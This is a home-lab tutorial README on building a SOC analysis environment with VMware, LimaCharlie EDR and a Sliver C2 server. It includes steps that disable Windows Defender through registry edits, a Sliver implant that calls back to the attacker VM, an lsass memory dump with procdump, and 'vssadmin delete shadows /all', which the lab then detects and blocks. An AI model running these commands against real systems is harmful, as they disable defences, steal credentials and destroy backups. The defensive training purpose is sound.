# 👨🏻‍💻 🌎  Building a SOC Analysis Lab Environment At Home 👨🏻‍💻 🌎 
## Lab Overview

This SOC Analyst home lab is an excellent opportunity to learn new skills beyond the basics and fundamentals. 

It involves a hands-on experience such as setting up virtualized environments, deploying operating systems, honing command line proficiency, and establishing C2 servers. 

The primary goal of the lab is to provide practical cybersecurity skills, addressing both offensive and defensive roles. It encompasses telemetry and EDR analysis using tools like Sysmon and LimaCharlie.
Through this structured exploration, individuals gain a comprehensive understanding of security operations. 
    
  ![image](https://github.com/forza-dc/SOC-Lab-at-Home/blob/main/SOC%20Lab%20Image%20final.jpg) 

### Overview

## Lab Components:
1.	Virtualized Environments:
•	Utilize virtualization platforms like VMware or VirtualBox for a realistic setup.
2.	Operating System Deployment:
•	Deploy Windows Server and Windows 10 VMs for targeted training scenarios.
3.	Command Line Proficiency:
•	Develop command line skills through practical exercises and simulated scenarios.
4.	C2 Server Setup:
•	Establish command and control servers to simulate offensive tactics.

## Learning Objectives:
1.	Telemetry and EDR Analysis:
•	Implement and configure Sysmon for enhanced telemetry and event logging.
•	Explore LimaCharlie for advanced endpoint detection and response (EDR).
2.	Security Operations:
•	Engage in structured exploration of security operations concepts.
•	Practice offensive and defensive cybersecurity strategies.
3.	Comprehensive Understanding:
•	Gain a holistic view of security operations beyond fundamental concepts.
•	Enhance proficiency in handling various cybersecurity challenges.

## Simulated Findings:
1.	Sysmon Alerts:
•	Simulate alerts for unusual process execution and unauthorized registry modification.
2.	LimaCharlie Insights:
•	Generate simulated detections for anomalous network communication and attempted privilege escalation.

## Concluding Insights:
1.	Transition to Cloud Security Engineering:
•	Leverage the acquired skills as a solid foundation for transitioning into cloud security engineering.
•	Bridge the gap between traditional cybersecurity practices and emerging cloud security challenges.
2.	Enhancing Cybersecurity Proficiency:
•	Recognize the importance of hands-on experience in honing cybersecurity skills.
•	Understand the practical application of telemetry analysis and EDR in real-world scenarios.



## Lab Requirements:

- **Virtualization Platform:**
  - VMware Workstation

- **Operating Systems:**
  - Ubuntu Server VM
    - [Download Ubuntu ISO](https://releases.ubuntu.com/22.04.1/ubuntu-22.04.1-live-server-amd64.iso)
  - Windows VM
    - [Download WinDev2311Eval.zip](https://developer.microsoft.com/en-us/windows/downloads/virtual-machines/)

- **Security Tools:**
  - LimaCharlie
    - Create an account and configure EDR on Windows VM
  - Sliver Framework
    - Set up a Command & Control server on Linux VM

- **Networking:**
  - Internet connection for VM downloads and configurations
  - SSH for Linux VM access

- **Administrative Privileges:**
  - Ensure administrative privileges for VM configurations
  - Disable Windows Defender on Windows VM


## VMware Workstation Configuration:

  - Open VMware Workstation and go to Edit and "Virtual Network Editor.
  - Create new VMnet with NAT configurations.

## UbuntuServer VM Installation and Configuration:

 - Download Ubuntu Server ISO and create a VM.
 - Remember to check Install OpenSSHserver check box during installation.
 - Ping google.com from Ubuntu Server terminal (ping–c 4 google.com).

  ![image](https://github.com/forza-dc/SOC-Lab-at-Home/blob/main/SOC%20Lab%20Img%202.png) 


## Windows VM Installation and Configuration:

- Download WinDev2311Eval.zip.
- Right click on WinDev2311Eval file and open with VMware workstation.


### Disabling Windows Defender:

1. After import, windows VM will login automatically with Username User. To disable windows defender, click on start à Settings.
2. Click Privacy & Security.
3. Open Windows Security.
4. Click Manage Settings.
5. Toggle OFF the "Tamper Protection" switch. When prompted, click "Yes".
6. Toggle every other option OFF as well.
7. Right click on start menu icon and type cmd, and open it as Administrator.
8. Type following command in cmd and press Enter.
  ![image](https://github.com/forza-dc/SOC-Lab-at-Home/blob/main/SOC%20Lab%20Img%203.png)
9. Again right click on start menu icon, click on "Run" and type "msconfig" and press Enter.
10. Go to "Boot" tab and select "Boot Options". Check the box for "Safe boot" and "Minimal".
11. When prompted, click on Restart.
12. Now, in Safe Mode, we'll disable some services via the Registry. Click the "Start" menu icon Type "regedit" into the search bar and hit Enter. For each of the following registry locations, you'll need to browse to the key, find the "Start" value, and change it to 4.
    
            Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Sense
            Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdBoot
            Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WinDefend
            Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdNisDrv
            Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdNisSvc
            Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdFilter
13. Again right click on start menu icon and click "Run" and type "msconfig".
    
15. Go to "Boot" tab and select "Boot Options". Uncheck the box for "Safe boot", click Apply and OK.

### Prevent the VM from going into standby:

After windows reboot in normal mode, open cmd with Administrative privileges and type following commands:

            powercfg /change standby-timeout-ac 0 
            powercfg /change standby-timeout-dc 0 
            powercfg /change monitor-timeout-ac 0 
            powercfg /change monitor-timeout-dc 0 
            powercfg /change hibernate-timeout-ac 0 
            powercfg /change hibernate-timeout-dc 0

## Install LimaCharlie EDR on Windows VM:

1. LimaCharlie is a very powerful "SecOps Cloud Platform". It not only comes with a cross- platform EDR agent, but also handles all of the log shipping/ingestion and has a threat detection engine. Create free account on [https://app.limacharlie.io/login](https://app.limacharlie.io/login). After creation of account, log in. Once logged into LimaCharlie, create an organization.
  
3. Once the organization is created, click "Add Sensor".
   
5. Select Windows, Provide a description such as: Windows VM - Lab, Click Create.
   
  ![image](https://github.com/forza-dc/SOC-Lab-at-Home/blob/main/SOC%20Lab%20Image%204.jpg) 

4. Specify the x86–64 (.exe) sensor.

  ![image](https://github.com/forza-dc/SOC-Lab-at-Home/blob/main/SOC%20Lab%20Image%205.jpg) 

5. Download the selected installer.
   
7. Open an Administrative PowerShell prompt and paste the following command.

  ![image](https://github.com/forza-dc/SOC-Lab-at-Home/blob/main/SOC%20Lab%20Image%206.jpg)

8. Next, we will copy the install command provided by LimaCharlie which contains the installation key. Paste this command into your open terminal.

  ![image](https://github.com/forza-dc/SOC-Lab-at-Home/blob/main/SOC%20Lab%20Image%207.jpg)

8.If everything worked correctly, in the LimaCharlie web UI you should also see the sensor reporting in.

  ![image](https://github.com/forza-dc/SOC-Lab-at-Home/blob/main/SOC%20Lab%20Image%208.jpg)

9. Now let's configure LimaCharlie to also ship the Sysmon event logs alongside its own EDR telemetry. In the left-side menu, click "Artifacts". Next to "Artifact Collection Rules" click "Add Rule".

  ![image](https://github.com/forza-dc/SOC-Lab-at-Home/blob/main/SOC%20Lab%20Image%209.jpg)

            Enter following details:
            Name: windows-sysmon-logs
            Platforms: Windows
            Path Pattern: wel://Microsoft-Windows-Sysmon/Operational:*
            Retention Period: 10
            Then Click "Save Rule"



## Setup Attack System:

We'll perform these steps from HOST system, by using SSH to access the Linux VM.
1. Using the statically assigned IP address we copied down in the Linux VM installation process, let's SSH onto the VM from host system.
   
  ![image](https://github.com/forza-dc/SOC-Lab-at-Home/blob/main/SOC%20Lab%20Image%2010.jpg)

2. Now, from within this new SSH session, proceed with the following instructions to setup our attacker Command & Control server. First, let's drop into a root shell.

  ![image](https://github.com/forza-dc/SOC-Lab-at-Home/blob/main/SOC%20Lab%20Image%2011.jpg)

3. Run the following commands to download Sliver, a Command & Control (C2) framework.

        wget https://github.com/BishopFox/sliver/releases/download/v1.5.34/sliver-server_linux -O
        usr/local/bin/sliver-server # Make it executable
        chmod +x /usr/local/bin/sliver-server
        # install mingw-w64 for additional capabilities apt install -y mingw-w64

  ![image](https://github.com/forza-dc/SOC-Lab-at-Home/blob/main/SOC%20Lab%20Image%2012.jpg)

4. Create a working directory which will be used in future steps.

  ![image](https://github.com/forza-dc/SOC-Lab-at-Home/blob/main/SOC%20Lab%20Image%2013.jpg)
   
## Generating C2 payload:

1. Open SSH session on the Linux VM (like in previous steps) and perform following actions.
   
       sudo su
       cd /opt/sliver sliver-server
   
  ![image](https://github.com/forza-dc/SOC-Lab-at-Home/blob/main/SOC%20Lab%20Image%2014.jpg)

2. Generate first C2 session payload (within the Sliver shell above). Be sure to use Linux VM's IP address we statically set.

          generate - http [Linux_VM_IP] - save /opt/sliver

  ![image](https://github.com/forza-dc/SOC-Lab-at-Home/blob/main/SOC%20Lab%20Image%2015.jpg)

3. Output of above mentioned command.

  ![image](https://github.com/forza-dc/SOC-Lab-at-Home/blob/main/SOC%20Lab%20Image%2016.jpg)

4. Confirm the new implant configuration by typing implants.

  ![image](https://github.com/forza-dc/SOC-Lab-at-Home/blob/main/SOC%20Lab%20Image%2017.jpg)

5. Now we have a C2 payload we can drop onto Windows VM. Type exit to exit Sliver for now.

  ![image](https://github.com/forza-dc/SOC-Lab-at-Home/blob/main/SOC%20Lab%20Image%2018.jpg)

6. To easily download the C2 payload from the Linux VM to the Windows VM, use following commands.

        cd /opt/sliver
        python3 -m http.server 80

  ![image](https://github.com/forza-dc/SOC-Lab-at-Home/blob/main/SOC%20Lab%20Image%2019.jpg)   

7. Switch to the Windows VM, launch Administrative PowerShell console and execute following command in PowerShell

  ![image](https://github.com/forza-dc/SOC-Lab-at-Home/blob/main/SOC%20Lab%20Image%2020.jpg)   

8. As a result of above mentioned command, a payload will be downloaded from Ubuntu server on Windows VM.

## Starting Command and Control Session:

1. Now that the payload is on the Windows VM, we must switch back to the Linux VM SSH session and enable the Sliver HTTP server to catch the callback.

   a. First, terminate the python web server we started by pressing Ctrl + C.
   b. Relaunch Sliver.
   c. Start the Sliver HTTP listener.

  ![image](https://github.com/forza-dc/SOC-Lab-at-Home/blob/main/SOC%20Lab%20Image%2021.jpg)  


2. Return to the Windows VM and execute the C2 payload from its download location using the same administrative PowerShell prompt we had from before.   
   
  ![image](https://github.com/forza-dc/SOC-Lab-at-Home/blob/main/SOC%20Lab%20Image%2022.jpg) 

3. Within a few moments, you should see your session check in on the Sliver server.

  ![image](https://github.com/forza-dc/SOC-Lab-at-Home/blob/main/SOC%20Lab%20Image%2023.jpg) 


4. Verify your session in Sliver by typing sessions.

  ![image](https://github.com/forza-dc/SOC-Lab-at-Home/blob/main/SOC%20Lab%20Image%2024.jpg) 

5. To interact with C2 session, type the following command into the Sliver shell, swapping [session_id] with yours


        use [session_id]

  ![image](https://github.com/forza-dc/SOC-Lab-at-Home/blob/main/SOC%20Lab%20Image%2025.jpg) 

6. You are now interacting directly with the C2 session on the Windows VM. Let's run a few basic commands.

     a. Get basic info about the session (type info).

  ![image](https://github.com/forza-dc/SOC-Lab-at-Home/blob/main/SOC%20Lab%20Image%2026.jpg)

     b. To check privileges, type command getprivs.


## Observe Endpoint Detection and Response (EDR) Telemetry:

1. Log into LimaCharlie web UI and click on Sensors on left menu and click on active Windows sensor (windev2311eval.localdomain)
2. On the new left-side menu for this sensor, click "Processes".
3. Now we filter our C2 process on the target windows VM.

  ![image](https://github.com/forza-dc/SOC-Lab-at-Home/blob/main/SOC%20Lab%20Image%2027.jpg)

4. Now we see where this process is communicating on the Network.

  ![image](https://github.com/forza-dc/SOC-Lab-at-Home/blob/main/SOC%20Lab%20Image%2028.jpg)

5. Let's see where it is communicating.

  ![image](https://github.com/forza-dc/SOC-Lab-at-Home/blob/main/SOC%20Lab%20Image%2029.jpg)

6. Now click the "File System" tab on the left-side menu.

7. Browse to the location we know our implant to be running from, i.e C:\Users\User\Downloads

![image](https://github.com/forza-dc/SOC-Lab-at-Home/blob/main/SOC%20Lab%20Image%2030.jpg)

8. Inspect the hash of the suspicious executable by scanning it with VirusTotal.

  ![image](https://github.com/forza-dc/SOC-Lab-at-Home/blob/main/SOC%20Lab%20Image%2031.jpg)

  ![image](https://github.com/forza-dc/SOC-Lab-at-Home/blob/main/SOC%20Lab%20Image%2032.jpg)

  ![image](https://github.com/forza-dc/SOC-Lab-at-Home/blob/main/SOC%20Lab%20Image%2033.jpg)
   
9. Click "Timeline" on the left-side menu of our sensor. This is a near real-time view of EDR telemetry + event logs streaming from this system.

  ![image](https://github.com/forza-dc/SOC-Lab-at-Home/blob/main/SOC%20Lab%20Image%2034.jpg)

10. Filter timeline with name of your implant.

  ![image](https://github.com/forza-dc/SOC-Lab-at-Home/blob/main/SOC%20Lab%20Image%2035.jpg)

11. Examine other events related to your implant process. It is responsible for other events such as "SENSITIVE_PROCESS_ACCESS".

  ![image](https://github.com/forza-dc/SOC-Lab-at-Home/blob/main/SOC%20Lab%20Image%2036.jpg)

## Detecting Events:

1. Get back onto an SSH session on the Linux VM, and drop into a C2 session on your victim. Run the following commands within the Sliver session on your victim host Getprivs

  ![image](https://github.com/forza-dc/SOC-Lab-at-Home/blob/main/SOC%20Lab%20Image%2037.jpg)

2. Next, let's do something adversaries love to do for stealing credentials on a system - dump the lsass.exe process from memory. Execute the following command: procdump -n lsass.exe -s lsass.dmp

  ![image](https://github.com/forza-dc/SOC-Lab-at-Home/blob/main/SOC%20Lab%20Image%2038.jpg)

3. Click on Timeline on LimaCharlie left menu and filter for "SENSITIVE_PROCESS_ACCESS".

  ![image](https://github.com/forza-dc/SOC-Lab-at-Home/blob/main/SOC%20Lab%20Image%2039.jpg)

  ![image](https://github.com/forza-dc/SOC-Lab-at-Home/blob/main/SOC%20Lab%20Image%2040.jpg)
   
4. Click on any event to see the details.
5. Now we will create a Detection & Response rule for this event.

  ![image](https://github.com/forza-dc/SOC-Lab-at-Home/blob/main/SOC%20Lab%20Image%2041.jpg)

6. In the "Detect" section of the new rule, remove all contents and replace them with this
   
        event: SENSITIVE_PROCESS_ACCESS
        op: ends with
        path: event/*/TARGET/FILE_PATH value: lsass.exe

  ![image](https://github.com/forza-dc/SOC-Lab-at-Home/blob/main/SOC%20Lab%20Image%2042.jpg)

8. In the "Respond" section of the new rule, remove all contents and replace them with this

        action: report name: LSASS access

  ![image](https://github.com/forza-dc/SOC-Lab-at-Home/blob/main/SOC%20Lab%20Image%2043.jpg)

9. Now test the Rule by clicking on "Test Event" at the bottom of the page.

  ![image](https://github.com/forza-dc/SOC-Lab-at-Home/blob/main/SOC%20Lab%20Image%2044.jpg)

10. Save the Rule and give it a name

  ![image](https://github.com/forza-dc/SOC-Lab-at-Home/blob/main/SOC%20Lab%20Image%2045.jpg)

11. Now return to Sliver server console and rerun the same procdump command. After rerunning the procdump command, go to the "Detections" tab on the LimaCharlie main left-side menu.

  ![image](https://github.com/forza-dc/SOC-Lab-at-Home/blob/main/SOC%20Lab%20Image%2046.jpg)


## Blocking Attacks:

1. Open C2 shell again and type "shell" and press "y".

2. In the new System shell, run the following command

       vssadmin delete shadows /all

3. Browse over to LimaCharlie's detection tab to see default Sigma rules.

  ![image](https://github.com/forza-dc/SOC-Lab-at-Home/blob/main/SOC%20Lab%20Image%2047.jpg)

4. Click to expand the detection and examine all of the metadata contained within the detection itself.

5. Craft a Detection & Response (D&R) rule from this event.

  ![image](https://github.com/forza-dc/SOC-Lab-at-Home/blob/main/SOC%20Lab%20Image%2048.jpg)

6. Add the following Response rule to the Respond section.

  ![image](https://github.com/forza-dc/SOC-Lab-at-Home/blob/main/SOC%20Lab%20Image%2049.jpg)

7. Save your rule with the following name: vss_deletion_kill_it.

8. Run the command to delete volume shadows again (vssadmin delete shadows /all). The command will return with the same error but the execution of command is enough to trigger the incident. Then type command "whoami". If our D&R rule worked successfully, the system shell will hang and fail to return anything from the whoami command, because the parent process was terminated.

  ![image](https://github.com/forza-dc/SOC-Lab-at-Home/blob/main/SOC%20Lab%20Image%2050.jpg)

9. Terminate your (now dead) system shell by pressing Ctrl + D.

## Concluison:

👨🏻‍💻 🚀 In conclusion, this SOC Analyst home lab provides invaluable hands-on experience, solidifying foundational skills essential for a future in cloud security engineering. This immersive journey has not only honed practical cybersecurity expertise but also paved the way for continued exploration and growth in tackling complex security challenges.👨🏻‍💻 🚀











   

